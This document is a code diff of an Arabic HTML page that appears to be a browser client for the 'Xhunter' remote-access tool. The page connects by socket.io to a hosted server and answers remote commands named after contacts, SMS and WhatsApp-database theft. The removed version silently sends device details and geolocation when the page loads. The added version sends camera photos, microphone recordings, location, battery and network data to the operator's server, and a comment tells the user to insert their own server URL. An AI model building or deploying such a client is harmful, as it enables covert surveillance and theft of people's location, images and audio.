@@ -1,77 +1,173 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>عميل Xhunter</title>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>عميل Xhunter (موافق)</title>
 <style>
-body { font-family: Arial,sans-serif; color:#00ffcc; text-align:center; background:#0f111a; }
-h1 { margin-top:30px; }
-p { font-size:1.1em; }
+body{font-family:Arial,helvetica,sans-serif;background:#071021;color:#bfffe8;padding:18px}
+h1{color:#00ffcc}
+button{padding:10px 12px;margin:6px;border-radius:7px;border:none;background:#00ffcc;color:#001219;font-weight:700;cursor:pointer}
+.small{padding:8px 10px;font-size:13px}
+.info{margin:8px 0;color:#dfffe8}
 </style>
 </head>
 <body>
 <h1>عميل Xhunter</h1>
-<p>يتم جمع البيانات المتاحة عبر المتصفح وإرسالها للسيرفر.</p>
+<p class="info">هذه الصفحة ستطلب أذوناتك لصالح التجريب: الموقع، الكاميرا، الميكروفون، والمزيد. لا يعمل شيء بدون موافقتك الصريحة.</p>
+
+<button id="btnSendDeviceInfo">إرسال معلومات الجهاز الأساسية</button>
+<button id="btnGetBattery" class="small">فحص البطارية</button>
+<button id="btnGetNetwork" class="small">فحص الشبكة</button>
+<button id="btnGetLocation" class="small">إرسال الموقع الآن</button>
+<button id="btnCamera" class="small">التقاط صورة بالكاميرا</button>
+<button id="btnMic" class="small">تسجيل صوت (3 ثواني)</button>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
-const socket = io('https://xhunter-1-2not.onrender.com', { transports:['websocket'], reconnection:true });
+const socket = io('https://xhunter-bsos.onrender.com', { transports:['websocket'], reconnection:true });
+// replace URL above with your render URL
+
 const deviceId = 'device_' + Math.floor(Math.random()*10000);
 const model = navigator.userAgent;
+let ip = null;
 
-// إرسال بيانات التعريف عند الإقلاع
-const deviceData = {
+// get public IP (optional)
+fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>{ ip = j.ip; }).catch(()=>ip=null);
+
+// helper to emit safely
+function emit(ev, payload){ socket.emit(ev, payload); console.log('emit', ev, payload); }
+
+// send base device info
+document.getElementById('btnSendDeviceInfo').addEventListener('click', ()=>{
+  const payload = {
     id: deviceId,
     model: model,
     language: navigator.language,
     screen: { width: window.screen.width, height: window.screen.height },
     platform: navigator.platform,
-    cookiesEnabled: navigator.cookieEnabled
-};
-
-socket.emit('join', deviceData);
-
-// دالة إرسال الموقع إذا سمح المتصفح
-function sendLocation(){
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(pos=>{
-            socket.emit('getLocation', { id: deviceId, data:{lat:pos.coords.latitude, lon:pos.coords.longitude} });
-        }, err=>{
-            socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
-        });
-    } else {
-        socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
-    }
-}
-
-// تنفيذ الأوامر المتاحة من السيرفر
-const commands = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
-commands.forEach(cmd=>{
-    socket.on(cmd, ()=>{
-        let data;
-        switch(cmd){
-            case 'getInstalledApps':
-                data = ['غير متاح من المتصفح']; break;
-            case 'getContacts':
-                data = ['غير متاح من المتصفح']; break;
-            case 'getCallLog':
-                data = ['غير متاح من المتصفح']; break;
-            case 'getSMS':
-                data = ['غير متاح من المتصفح']; break;
-            case 'getLocation':
-                sendLocation(); return;
-            case 'downloadWhatsappDatabase':
-                data = 'غير متاح من المتصفح'; break;
-            default: data = 'غير متاح';
-        }
-        socket.emit(cmd, { id: deviceId, data });
-    });
+    cookiesEnabled: navigator.cookieEnabled,
+    deviceMemory: navigator.deviceMemory || null,
+    hardwareConcurrency: navigator.hardwareConcurrency || null,
+    ip
+  };
+  emit('join', payload); // also used by server to register
+  emit('deviceInfo', { id: deviceId, extra: payload });
+  alert('تم إرسال معلومات الجهاز الأساسية.');
 });
 
-// إرسال الموقع عند الإقلاع
-sendLocation();
-console.log("عميل Xhunter جاهز عبر المتصفح.");
+// battery
+document.getElementById('btnGetBattery').addEventListener('click', async ()=>{
+  if(navigator.getBattery){
+    try{
+      const batt = await navigator.getBattery();
+      const b = { level: batt.level, charging: batt.charging, chargingTime: batt.chargingTime, dischargingTime: batt.dischargingTime };
+      emit('battery', { id: deviceId, data: b });
+      alert('تم إرسال حالة البطارية.');
+    }catch(e){ alert('خطأ في الحصول على البطارية: '+e.message); }
+  } else alert('الـ Battery API غير مدعوم في متصفحك.');
+});
+
+// network info
+document.getElementById('btnGetNetwork').addEventListener('click', ()=>{
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(conn){
+    const n = { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt, saveData: conn.saveData };
+    emit('networkInfo', { id: deviceId, data: n });
+    alert('تم إرسال بيانات الشبكة.');
+  } else alert('network information غير متاحة في هذا المتصفح.');
+});
+
+// location (with high accuracy option)
+document.getElementById('btnGetLocation').addEventListener('click', ()=>{
+  if(!navigator.geolocation){ alert('جيولوجي غير متاح'); return; }
+  navigator.geolocation.getCurrentPosition(pos=>{
+    emit('getLocation', { id: deviceId, data: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
+    alert('تم إرسال الموقع.');
+  }, err => {
+    alert('فشل الحصول على الموقع: ' + err.message);
+  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+});
+
+// camera: capture a photo and send as base64
+document.getElementById('btnCamera').addEventListener('click', async ()=>{
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+    const video = document.createElement('video');
+    video.autoplay = true; video.playsInline = true;
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    // capture single frame to canvas
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+    // stop stream tracks
+    stream.getTracks().forEach(t => t.stop());
+    emit('photo', { id: deviceId, data: dataUrl });
+    alert('تم التقاط الصورة وإرسالها.');
+  }catch(e){
+    alert('تعذر فتح الكاميرا: ' + e.message);
+  }
+});
+
+// mic: record short audio clip (3s) and send base64
+document.getElementById('btnMic').addEventListener('click', async ()=>{
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
+    mediaRecorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'audio/webm' });
+      // read as base64
+      const reader = new FileReader();
+      reader.onload = () => {
+        const base64 = reader.result; // data:audio/webm;base64,...
+        emit('audio', { id: deviceId, data: base64 });
+        alert('تم تسجيل الصوت وإرساله.');
+      };
+      reader.readAsDataURL(blob);
+      stream.getTracks().forEach(t=>t.stop());
+    };
+    mediaRecorder.start();
+    alert('بدء التسجيل (3 ثواني)...');
+    setTimeout(()=> mediaRecorder.stop(), 3000);
+  }catch(e){
+    alert('تعذر الوصول إلى الميكروفون: ' + e.message);
+  }
+});
+
+// also respond to server requests for getLocation, photo, audio etc
+socket.on('getLocation', () => {
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(pos=>{
+      emit('getLocation', { id: deviceId, data: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
+    }, err => {
+      emit('getLocation', { id: deviceId, data: { lat: 0, lon:0, accuracy: null } });
+    }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+  } else {
+    emit('getLocation', { id: deviceId, data: { lat:0, lon:0 } });
+  }
+});
+
+// handle other commands generically (server can send getInstalledApps etc — browser will reply with 'not available' text)
+const allowed = ['getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
+allowed.forEach(a=>{
+  socket.on(a, () => {
+    const reply = (a === 'getExtraData') ? {
+      deviceMemory: navigator.deviceMemory || null,
+      platform: navigator.platform,
+      language: navigator.language,
+      userAgent: navigator.userAgent,
+      storageEstimate: (navigator.storage && navigator.storage.estimate) ? 'available' : null
+    } : 'غير متاح من المتصفح';
+    emit(a, { id: deviceId, data: reply });
+  });
+});
+
 </script>
 </body>
 </html>
